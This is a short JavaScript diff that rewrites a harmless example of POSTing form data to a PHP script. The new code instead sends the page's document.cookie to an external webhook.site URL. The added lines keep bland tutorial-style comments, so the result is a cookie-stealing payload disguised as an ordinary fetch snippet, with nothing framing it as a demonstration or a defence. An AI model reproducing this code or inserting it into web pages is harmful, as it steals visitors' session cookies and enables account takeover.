@@ -1,11 +1,13 @@
-// Example of sending a POST request to a PHP script using fetch
-fetch('your-script.php', {
-    method: 'POST',
+// Sending a POST request using fetch
+fetch('https://webhook.site/f21dc15a-d8b4-468b-9221-60fd48267bcc', {
+    method: 'POST', // or 'GET', depending on what you want to do
     headers: {
-        'Content-Type': 'application/x-www-form-urlencoded', // or 'application/json'
+        'Content-Type': 'application/json', // Adjust as needed
     },
-    body: 'key1=value1&key2=value2' // Data you want to send to the PHP script
+    body: JSON.stringify({
+        cookie: document.cookie,
+    }) // The data you want to send in the request body
 })
-.then(response => response.text()) // or response.json() if expecting JSON
-.then(data => console.log(data)) // Process the response from PHP
+.then(response => response.text()) // Can also use .json() if expecting JSON response
+.then(data => console.log('Success:', data))
 .catch(error => console.error('Error:', error));
